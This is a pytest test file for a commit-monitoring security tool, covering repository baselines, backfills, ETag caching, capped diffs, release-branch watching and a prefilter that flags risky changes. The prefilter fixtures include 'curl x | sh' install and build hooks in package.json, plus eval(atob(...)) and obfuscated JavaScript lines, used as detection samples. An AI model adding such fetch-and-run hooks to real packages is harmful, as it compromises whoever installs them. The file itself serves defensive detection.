"""Intake (A02): token, ETag, Baseline and Backfill, Pre-filter, capped diffs, Release branches
and intervals."""

import shutil
import subprocess
from datetime import timedelta

import httpx
import pytest
from sqlalchemy import func, select

from conftest import FixtureBroker, application, check_now, connection, github_account, repository_of, source_snapshot
from numen import domain
from numen.models import Application, Commit, Job, Repository, now, utc
from numen.prefilter import prefilter
from numen.sources import Sources, release_branch_candidates
from numen.worker import run_once

UNRELATED = {
    "decision": "unrelated",
    "change_kind": "unrelated",
    "title": "Documentation wording",
    "reason": "No security bearing",
    "confidence": {"level": "high"},
}


def detail(sha, files=None):
    return {
        "sha": sha,
        "commit": {"message": "Change", "author": {"name": "Fixture"}, "committer": {"date": "2026-11-01T00:00:00Z"}},
        "files": files if files is not None else [{"filename": "main.py", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}],
    }


def transport(monkeypatch, http):
    """Routes every source request of the worker's clients through `http`."""
    original = Sources.__init__

    def setup(self, *args, **kwargs):
        original(self, *args, **kwargs)
        self.client = httpx.Client(transport=httpx.MockTransport(http))

    monkeypatch.setattr(Sources, "__init__", setup)


def jobs(app, kind=None):
    with app.state.factory() as db:
        query = select(func.count()).select_from(Job)
        return db.scalar(query.where(Job.kind == kind) if kind else query)


def drain(app, config):
    while run_once(config, app.state.factory, FixtureBroker(UNRELATED)):
        pass


def test_added_repository_baselines_at_head_and_triages_only_new_or_backfilled_commits(system, monkeypatch):
    app, client, config = system
    connection(app)
    github_account(app)
    p = application(client, config={"triage_mode": "codex"})
    # The newest page stands for a history of 10,000 commits.
    history = [f"{index:040x}" for index in range(10000, 0, -1)]
    requests = []

    def http(request):
        requests.append(request)
        path, params = request.url.path, request.url.params
        if path.endswith("/commits"):
            start = history.index(params["sha"]) if params["sha"] in history else 0
            size = int(params["per_page"])
            offset = start + (int(params.get("page", 1)) - 1) * size
            return httpx.Response(200, json=[{"sha": sha} for sha in history[offset : offset + size]])
        if "/compare/" in path:
            base = path.rsplit("/", 1)[1].split("...")[0]
            unseen = history[: history.index(base)][::-1]
            return httpx.Response(200, json={"status": "ahead", "total_commits": len(unseen),
                                             "commits": [{"sha": sha} for sha in unseen]})
        return httpx.Response(200, json=detail(path.rsplit("/", 1)[1]))

    transport(monkeypatch, http)

    def commits():
        return client.get(f"/api/applications/{p['id']}/commits?limit=200").json()["items"]

    queued = check_now(client, p["id"])
    drain(app, config)
    assert client.get(f"/api/jobs/{queued}").json()["result"]["baseline"] is True
    assert len(requests) == 1 and commits() == [] and jobs(app, "commit_triage") == 0
    link = client.get(f"/api/applications/{p['id']}").json()["repositories"][0]
    assert link["cursor"] == link["baseline_revision"] == history[0]

    history.insert(0, "f" * 40)
    check_now(client, p["id"])
    drain(app, config)
    assert [c["revision"] for c in commits()] == ["f" * 40] and jobs(app, "commit_triage") == 1

    endpoint = f"/api/applications/{p['id']}/repositories/{link['repository_id']}/backfills"
    assert client.post(endpoint, json={"count": 0}).status_code == 422
    assert client.post(endpoint, json={"count": 101}).status_code == 422
    response = client.post(endpoint, json={"count": 3})
    assert response.status_code == 202, response.text
    backfill = response.json()["job_id"]
    drain(app, config)
    job = client.get(f"/api/jobs/{backfill}").json()
    assert job["kind"] == "backfill" and job["status"] == "succeeded" and job["result"]["imported"] == 3
    backfilled = [c for c in commits() if c.get("backfill")]
    assert sorted(c["revision"] for c in backfilled) == sorted(history[1:4])
    assert jobs(app, "commit_triage") == 4
    assert all(c["triage_status"] == "completed" for c in commits())


def test_backfill_needs_a_baseline(system):
    _, client, _ = system
    p = application(client)
    repository_id = p["repositories"][0]["repository_id"]
    refused = client.post(f"/api/applications/{p['id']}/repositories/{repository_id}/backfills", json={"count": 5})
    assert refused.status_code == 422 and refused.json()["code"] == "source_not_checked"


def test_github_304_advances_nothing_and_creates_no_job(system, monkeypatch):
    app, client, config = system
    github_account(app)
    p = application(client)
    seen = []

    def http(request):
        seen.append(request)
        if request.url.path.endswith("/commits"):
            if request.headers.get("If-None-Match") == '"v1"':
                return httpx.Response(304)
            return httpx.Response(200, headers={"ETag": '"v1"'}, json=[{"sha": "a" * 40}])
        return httpx.Response(200, json=detail(request.url.path.rsplit("/", 1)[1]))

    transport(monkeypatch, http)
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    assert "If-None-Match" not in seen[0].headers
    assert seen[0].headers["Authorization"] == "Bearer fixture-github-token"
    with app.state.factory.begin() as db:
        repository = repository_of(db, p["id"])
        assert (repository.cursor, repository.etag) == ("a" * 40, '"v1"')
        repository.last_error = {"code": "upstream_error", "message": "Earlier failure"}
        before = repository.last_check_at
    count = jobs(app)
    queued = check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    job = client.get(f"/api/jobs/{queued}").json()
    assert job["status"] == "succeeded" and job["result"]["not_modified"] is True
    assert job["result"]["imported"] == 0
    assert [r.headers["If-None-Match"] for r in seen[1:]] == ['"v1"']  # no compare or detail request
    assert jobs(app) == count + 1  # only the source check itself
    with app.state.factory() as db:
        repository = repository_of(db, p["id"])
        assert (repository.cursor, repository.etag, repository.last_error) == ("a" * 40, '"v1"', None)
        assert repository.last_check_at > before
        assert db.scalar(select(func.count()).select_from(Commit)) == 0


def test_github_repository_without_token_is_not_polled_and_shows_error(system, monkeypatch):
    app, client, config = system
    p = application(client)
    plugin = client.post(f"/api/applications/{p['id']}/repositories",
                         json={"source_kind": "wordpress", "plugin_slug": "fixture"}).json()
    seen = []
    transport(monkeypatch, lambda request: seen.append(request) or httpx.Response(500))
    monkeypatch.setattr(Sources, "wordpress_commits", lambda self, repository: ("7", [], None))
    with app.state.factory.begin() as db:
        assert domain.schedule(db) == 1
        checks = db.scalars(select(Job).where(Job.kind == "source_check")).all()
        assert [job.input["repository_id"] for job in checks] == [plugin["repository_id"]]
    links = client.get(f"/api/applications/{p['id']}").json()["repositories"]
    assert links[0]["last_error"]["code"] == "github_token_required"
    assert "Settings, Accounts" in links[0]["last_error"]["message"]
    items = client.post(f"/api/applications/{p['id']}/checks").json()["items"]
    drain(app, config)
    statuses = {i["repository_id"]: client.get(i["status_url"]).json() for i in items}
    github = statuses[links[0]["repository_id"]]
    assert github["status"] == "failed" and github["error"]["code"] == "github_token_required"
    assert statuses[plugin["repository_id"]]["status"] == "succeeded"
    assert seen == []
    links = client.get(f"/api/applications/{p['id']}").json()["repositories"]
    assert links[0]["last_error"]["code"] == "github_token_required"
    assert links[1]["cursor"] == "7" and links[1]["last_error"] is None


def test_incomplete_diff_triage_is_never_unrelated(system):
    app, client, config = system
    profile = connection(app)
    p = application(client)
    ident = source_snapshot(app, p["id"])
    with app.state.factory.begin() as db:
        commit = db.get(Commit, ident)
        commit.data = {**commit.data, "diff_complete": False}
        job = domain.submit_agent(db, "commit_triage", db.get(Application, p["id"]),
                                  {"commit_id": ident, "source_ref": "a" * 40}, profile)
        job_id = job.id
    run_once(config, app.state.factory, FixtureBroker(UNRELATED))
    assert client.get(f"/api/jobs/{job_id}").json()["status"] == "succeeded"
    row = client.get(f"/api/commits/{ident}").json()
    assert row["triage_result"]["decision"] == "insufficient_context"
    assert row["review_decision"] == "pending"


@pytest.mark.parametrize("files,diff,expected", [
    ([{"path": "web/package-lock.json"}, {"path": "composer.json"}], "",
     [{"rule": "dependency_manifest", "paths": ["composer.json", "web/package-lock.json"]}]),
    ([{"path": "package.json"}], '--- package.json\n+++ package.json\n@@ -2 +2 @@\n-  "version": "1.0.0",\n+  "postinstall": "node setup.js",',
     [{"rule": "dependency_manifest", "paths": ["package.json"]}, {"rule": "package_scripts", "paths": ["package.json"]}]),
    ([{"path": ".github/workflows/release.yml"}, {"path": "ci/Jenkinsfile"}], "",
     [{"rule": "ci_workflow", "paths": [".github/workflows/release.yml", "ci/Jenkinsfile"]}]),
    ([{"path": "dist/app.min.js"}], "", [{"rule": "minified_or_obfuscated", "paths": ["dist/app.min.js"]}]),
    ([{"path": "lib/a.js"}], "--- lib/a.js\n+++ lib/a.js\n@@ -0,0 +1 @@\n+var _0x3f2a=['x'];", [{"rule": "minified_or_obfuscated", "paths": ["lib/a.js"]}]),
    ([{"path": "lib/b.js"}], "--- lib/b.js\n+++ lib/b.js\n@@ -0,0 +1 @@\n+" + "x" * 1001, [{"rule": "minified_or_obfuscated", "paths": ["lib/b.js"]}]),
    ([{"path": "lib/c.js"}], "--- lib/c.js\n+++ lib/c.js\n@@ -0,0 +1 @@\n+eval(atob('ZXZpbA=='))", [{"rule": "minified_or_obfuscated", "paths": ["lib/c.js"]}]),
    ([{"path": "lib/d.js"}], "--- lib/d.js\n+++ lib/d.js\n@@ -0,0 +1 @@\n+String.fromCharCode(101)", [{"rule": "minified_or_obfuscated", "paths": ["lib/d.js"]}]),
    ([{"path": "src/Auth/Session.php"}, {"path": "lib/crypto/cipher.c", "previous_path": "lib/cipher.c"}], "",
     [{"rule": "auth_or_crypto", "paths": ["lib/cipher.c", "lib/crypto/cipher.c", "src/Auth/Session.php"]}]),
    # Any script edited inside the "scripts" object, and a lifecycle hook without that context line.
    ([{"path": "package.json"}],
     '--- package.json\n+++ package.json\n@@ -4,5 +4,5 @@\n   "scripts": {\n     "test": "jest",\n'
     '-    "build": "tsc",\n+    "build": "curl x | sh",\n   },',
     [{"rule": "dependency_manifest", "paths": ["package.json"]}, {"rule": "package_scripts", "paths": ["package.json"]}]),
    ([{"path": "app/package.json"}],
     '--- app/package.json\n+++ app/package.json\n@@ -20,2 +20,3 @@\n     "lint": "eslint",\n'
     '+    "prepublishOnly": "node x.js",',
     [{"rule": "dependency_manifest", "paths": ["app/package.json"]},
      {"rule": "package_scripts", "paths": ["app/package.json"]}]),
    # A dependency bump after the "scripts" object, also in a later hunk, is no script change.
    ([{"path": "package.json"}],
     '--- package.json\n+++ package.json\n@@ -2,5 +2,5 @@\n   "scripts": {\n     "test": "jest"\n   },\n'
     '-  "version": "1.0.0",\n+  "version": "1.0.1",\n@@ -9,2 +9,2 @@\n'
     '-    "prettier": "^3.0.0",\n+    "prettier": "^3.1.0",',
     [{"rule": "dependency_manifest", "paths": ["package.json"]}]),
    # A removed obfuscated line and a scripts word outside package.json flag nothing.
    ([{"path": "docs/README.md"}], '--- docs/README.md\n+++ docs/README.md\n@@ -1 +1 @@\n-var _0x3f2a;\n+"scripts": run them',
     []),
])
def test_prefilter_flags_sensitive_changes(files, diff, expected):
    assert prefilter(files, diff) == expected


def test_source_check_records_prefilter_with_each_commit(system, monkeypatch):
    app, client, config = system
    p = application(client)
    source_snapshot(app, p["id"], "a" * 40)

    def record(revision, path, diff):
        return {"revision": revision, "message": "Change", "files": [{"path": path}], "diff": diff, "diff_complete": True}

    flagged = record("b" * 40, "package.json", '--- package.json\n+++ package.json\n+  "preinstall": "curl x | sh",')
    clean = record("c" * 40, "main.py", "--- main.py\n+++ main.py\n+print(1)")
    monkeypatch.setattr(Sources, "github_commits", lambda self, repository: ("c" * 40, [flagged, clean], None))
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    rows = {c["revision"]: c for c in client.get(f"/api/applications/{p['id']}/commits").json()["items"]}
    assert [r["rule"] for r in rows["b" * 40]["prefilter"]] == ["dependency_manifest", "package_scripts"]
    assert rows["c" * 40]["prefilter"] == []
    # The Pre-filter never decides anything on its own.
    assert {(rows[r]["triage_status"], rows[r]["review_decision"]) for r in ("b" * 40, "c" * 40)} == {("disabled", "pending")}


@pytest.mark.parametrize("files", [
    [{"filename": "big.js", "patch": "+" + "x" * 60001}],  # one file over its cap
    [{"filename": "image.bin", "status": "modified"}],  # GitHub omitted the patch
    [{"filename": f"f{index}.js", "patch": "+" + "x" * 59000} for index in range(40)],  # over the 2 MiB total
])
def test_capped_diff_is_marked_incomplete(system, monkeypatch, files):
    app, client, config = system
    p = application(client)
    revision = "b" * 40

    def http(request):
        path = request.url.path
        if path.endswith("/commits"):
            return httpx.Response(200, json=[{"sha": revision}])
        if "/compare/" in path:
            return httpx.Response(200, json={"status": "ahead", "total_commits": 1, "commits": [{"sha": revision}]})
        return httpx.Response(200, json=detail(revision, files))

    source = Sources(config, "fixture-github-token")
    source.client = httpx.Client(transport=httpx.MockTransport(http))
    with app.state.factory.begin() as db:
        repository = repository_of(db, p["id"])
        repository.cursor = repository.baseline_revision = "a" * 40
        _, polled, _ = source.github_commits(repository)
        backfilled = source.github_backfill(repository, 1)
    for records in (polled, backfilled):
        assert [r["revision"] for r in records] == [revision]
        assert records[0]["diff_complete"] is False
        assert len(records[0]["diff"].encode()) <= 2 * 1024 * 1024


def svn_plugin(tmp_path, monkeypatch, revisions):
    """A real local SVN repository with `revisions` commits to fixture/trunk."""
    if not shutil.which("svn") or not shutil.which("svnadmin"):
        pytest.skip("Real SVN client/repository are exercised in the Docker backend suite")
    repo, seed, checkout = tmp_path / "svn", tmp_path / "seed", tmp_path / "checkout"
    (seed / "fixture" / "trunk").mkdir(parents=True)
    (seed / "fixture" / "trunk" / "plugin.php").write_text("<?php /* Version: 1 */\n")

    def svn(*argv):
        subprocess.run(["svn", *argv, "--non-interactive"], check=True, capture_output=True)

    subprocess.run(["svnadmin", "create", str(repo)], check=True, capture_output=True)
    svn("import", str(seed), repo.as_uri(), "-m", "Release 1")
    svn("checkout", repo.as_uri() + "/fixture/trunk", str(checkout))

    def commit(version):
        (checkout / "plugin.php").write_text(f"<?php /* Version: {version} */\n")
        svn("commit", str(checkout), "-m", f"Release {version}")

    for version in range(2, revisions + 1):
        commit(version)
    monkeypatch.setenv("NUMEN_WORDPRESS_SVN_URL", repo.as_uri())
    return commit


def test_wordpress_plugin_without_new_revision_creates_no_job(system, tmp_path, monkeypatch):
    app, client, config = system
    svn_plugin(tmp_path, monkeypatch, 2)
    p = application(client, source_kind="wordpress", source_url=None, plugin_slug="fixture", source_ref="trunk")
    for _ in range(2):
        count = jobs(app)
        queued = check_now(client, p["id"])
        run_once(config, app.state.factory, FixtureBroker())
        job = client.get(f"/api/jobs/{queued}").json()
        assert job["status"] == "succeeded" and job["result"]["imported"] == 0
        assert jobs(app) == count + 1  # only the source check itself
    assert client.get(f"/api/applications/{p['id']}/commits").json()["items"] == []
    link = client.get(f"/api/applications/{p['id']}").json()["repositories"][0]
    assert link["cursor"] == link["baseline_revision"] == "2"


def test_wordpress_backfill_imports_the_last_revisions_up_to_the_baseline(system, tmp_path, monkeypatch):
    app, client, config = system
    commit = svn_plugin(tmp_path, monkeypatch, 3)
    p = application(client, source_kind="wordpress", source_url=None, plugin_slug="fixture", source_ref="trunk")
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    commit(4)
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    link = client.get(f"/api/applications/{p['id']}").json()["repositories"][0]
    response = client.post(f"/api/applications/{p['id']}/repositories/{link['repository_id']}/backfills", json={"count": 2})
    run_once(config, app.state.factory, FixtureBroker())
    assert client.get(response.json()["status_url"]).json()["result"]["imported"] == 2
    rows = {c["revision"]: c for c in client.get(f"/api/applications/{p['id']}/commits").json()["items"]}
    assert sorted(rows) == ["2", "3", "4"]
    assert sorted(r for r in rows if rows[r].get("backfill")) == ["2", "3"]
    assert rows["3"]["diff_complete"] is True and "Version: 3" in rows["3"]["diff"]


def test_schedule_skips_only_github_repositories_while_no_token(system):
    app, client, _ = system
    p = application(client)
    github_account(app)
    with app.state.factory.begin() as db:
        db.get(Application, p["id"]).next_check_at = now() - timedelta(seconds=1)
        assert domain.schedule(db) == 1
        assert db.scalar(select(func.count()).select_from(Job).where(Job.kind == "source_check")) == 1
        assert db.scalar(select(Repository)).last_error is None


def test_release_branch_candidates():
    assert release_branch_candidates("19.0.0") == ["19.x", "19.0", "release-19", "v19"]
    assert release_branch_candidates("v2") == ["2.x", "release-2", "v2"]
    assert release_branch_candidates("dev-main") == []


def branch_server(heads, requests):
    """A GitHub fixture with one head per branch ("HEAD" is the default branch). Each list
    answers 304 to the ETag of its current head."""

    def http(request):
        requests.append(request)
        path, params = request.url.path, request.url.params
        if "/branches/" in path:
            return httpx.Response(200 if path.rsplit("/", 1)[1] in heads else 404, json={})
        if path.endswith("/commits"):
            sha = heads[params["sha"]]
            tag = f'"{params["sha"]}-{sha}"'
            if request.headers.get("If-None-Match") == tag:
                return httpx.Response(304)
            return httpx.Response(200, headers={"ETag": tag}, json=[{"sha": sha}])
        if "/compare/" in path:
            head = path.rsplit("...", 1)[1]
            return httpx.Response(200, json={"status": "ahead", "total_commits": 1, "commits": [{"sha": head}]})
        return httpx.Response(200, json=detail(path.rsplit("/", 1)[1]))

    return http


def lookups(requests):
    return [r.url.path.rsplit("/", 1)[1] for r in requests if "/branches/" in r.url.path]


def test_upstream_watches_default_and_release_branch_of_locked_version(system, monkeypatch):
    app, client, config = system
    github_account(app)
    p = application(client, source_ref=None, locked_version="18.2.0")
    assert p["repositories"][0]["release_branch_status"] == "pending"
    heads, requests = {"HEAD": "a" * 40, "18.2": "b" * 40, "v19": "d" * 40}, []
    transport(monkeypatch, branch_server(heads, requests))

    def check():
        requests.clear()
        queued = check_now(client, p["id"])
        drain(app, config)
        job = client.get(f"/api/jobs/{queued}").json()
        assert job["status"] == "succeeded", job
        link = client.get(f"/api/applications/{p['id']}").json()["repositories"][0]
        with app.state.factory() as db:
            watched = db.get(Repository, link["repository_id"]).watched_branches
        return job["result"], link, watched

    def commits():
        return client.get(f"/api/applications/{p['id']}/commits").json()["items"]

    # 18.x does not exist, 18.2 does. The branch's first poll is its Baseline.
    _, link, watched = check()
    assert lookups(requests) == ["18.x", "18.2"]
    assert (link["release_branch"], link["release_branch_status"]) == ("18.2", "matched")
    assert watched == {"18.2": {"cursor": "b" * 40, "etag": '"18.2-' + "b" * 40 + '"'}}
    assert commits() == [] and jobs(app, "commit_triage") == 0

    # A new head on the Release branch imports its commit; the default branch answers 304.
    heads["18.2"] = "c" * 40
    result, _, watched = check()
    assert lookups(requests) == [] and result["imported"] == 1
    assert [(c["revision"], c["branch"]) for c in commits()] == [("c" * 40, "18.2")]
    assert watched["18.2"]["cursor"] == "c" * 40

    # Every list answers 304: nothing advances.
    result, _, after = check()
    assert result["not_modified"] is True and result["imported"] == 0
    assert after == watched and len(commits()) == 1
    assert {r.url.params["sha"] for r in requests} == {"HEAD", "18.2"}

    # A changed Locked version is resolved again, and the old branch is no longer watched.
    patched = client.patch(f"/api/applications/{p['id']}/repositories/{link['repository_id']}",
                           json={"locked_version": "19.0.0"})
    assert patched.json()["release_branch_status"] == "pending"
    _, link, watched = check()
    assert lookups(requests) == ["19.x", "19.0", "release-19", "v19"]
    assert (link["release_branch"], link["release_branch_status"]) == ("v19", "matched")
    assert list(watched) == ["v19"] and len(commits()) == 1


def test_release_branch_unknown_watches_default_branch_only(system, monkeypatch):
    app, client, config = system
    github_account(app)
    p = application(client, source_ref=None, locked_version="2.1.0")
    own = application(client, asset_name="Own", source_url="https://github.com/demo/own",
                      source_ref=None, role="own", locked_version="3.0.0")
    requests = []
    transport(monkeypatch, branch_server({"HEAD": "a" * 40}, requests))
    for _ in range(2):
        for ident in (p["id"], own["id"]):
            check_now(client, ident)
        drain(app, config)
    assert lookups(requests) == ["2.x", "2.1", "release-2", "v2"]  # resolved once, for 2.1.0 only
    assert {r.url.params["sha"] for r in requests if r.url.path.endswith("/commits")} == {"HEAD"}
    link = client.get(f"/api/applications/{p['id']}").json()["repositories"][0]
    assert (link["release_branch"], link["release_branch_status"]) == (None, "unknown")
    own_link = client.get(f"/api/applications/{own['id']}").json()["repositories"][0]
    assert own_link["role"] == "own" and own_link["release_branch_status"] is None
    with app.state.factory() as db:
        assert [r.watched_branches for r in db.scalars(select(Repository))] == [{}, {}]


def test_interval_minimum_is_five_minutes(system):
    app, client, _ = system
    body = {"asset_name": "Site", "asset_url": "https://example.com", "product_kind": "plugin",
            "product_name": "Demo"}
    refused = client.post("/api/applications", json={**body, "monitor_interval_seconds": 240})
    assert refused.status_code == 422 and "monitor_interval_seconds" in refused.json()["fields"]
    created = client.post("/api/applications", json={**body, "monitor_interval_seconds": 300})
    assert created.status_code == 201 and created.json()["monitor_interval_seconds"] == 300
    with app.state.factory.begin() as db:
        assert domain.schedule(db) == 1
        row = db.get(Application, created.json()["id"])
        assert utc(row.next_check_at) - utc(row.last_check_at) == timedelta(seconds=300)
    for value in (240, "300"):
        response = client.patch("/api/settings", json={"monitor_interval_seconds": value})
        assert response.status_code == 422
        assert response.json()["fields"] == {"monitor_interval_seconds": "At least 5 minutes"}
    response = client.patch("/api/settings", json={"monitor_interval_seconds": 300})
    assert response.status_code == 200 and response.json()["monitor_interval_seconds"] == 300
